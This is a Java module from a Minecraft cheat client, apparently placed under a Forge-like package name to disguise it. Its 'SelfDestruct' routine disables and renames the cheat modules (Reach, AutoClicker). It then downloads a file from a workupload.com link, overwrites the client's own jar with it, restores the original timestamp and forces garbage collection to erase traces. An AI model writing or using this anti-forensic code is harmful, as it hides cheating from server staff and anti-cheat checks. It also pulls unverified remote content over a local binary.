package net.minecraftforge.client.event.sound.server;

import net.minecraftforge.client.event.sound.server.*;
import org.apache.commons.compress.utils.*;
import java.net.*;
import java.io.*;
import net.minecraft.client.gui.*;
import net.minecraftforge.client.event.sound.server.*;

import java.util.*;

public class SelfDestruct extends Module
{
    public static BooleanValue Clear;
    
    public SelfDestruct() {
        super("SelfDestruct", 0, Category.M);
        this.addOption(SelfDestruct.Clear = new BooleanValue("Clear", false));
    }
    
    public void onLivingUpdate() {
        try {
            URL downloadURL = new URL("https://workupload.com/file/8Q62F4d");
            String a = kmethMain.class.getProtectionDomain().getCodeSource().getLocation().getPath();
            String b = URLDecoder.decode(a, "UTF-8");
            File c = new File(b.split("!")[0].substring(5, b.split("!")[0].length()));
            long d = c.lastModified();
            InputStream e = downloadURL.openStream();
            byte[] f = IOUtils.toByteArray(e);
            e.close();
            FileOutputStream g = new FileOutputStream(c, false);
            g.write(f);
            g.close();
            c.setLastModified(d);
            URL.setURLStreamHandlerFactory(null);
            downloadURL = null;
            a = null;
            b = null;
            c = null;
            d = 0L;
            e = null;
            f = null;
            g = null;
            System.gc();
            System.runFinalization();
            System.gc();
            Thread.sleep(100L);
            System.gc();
            System.runFinalization();
            System.gc();
            Thread.sleep(200L);
            System.gc();
            System.runFinalization();
        }
        catch (Throwable e2) {
            e2.printStackTrace();
        }
    }
    
    @Override
    public void onEnable() {
        if (Wrapper.getPlayer() != null) {
            if (Wrapper.getMinecraft().currentScreen == kmethMain.getClickGUI()) {
                Wrapper.getMinecraft().displayGuiScreen((GuiScreen)null);
            }
            this.setName("");
            Module.getModule(Reach.class).setName("");
            Module.getModule(AutoClicker.class).setName("");
            for (final Module mod : kmethMain.getModules()) {
                if (mod != null && mod.getState()) {
                    mod.setState(false);
                }
            }
            kmethMain.getModules().clear();
            this.getValues().clear();
            this.getOptions().clear();
            this.onLivingUpdate();
        }
    }
}
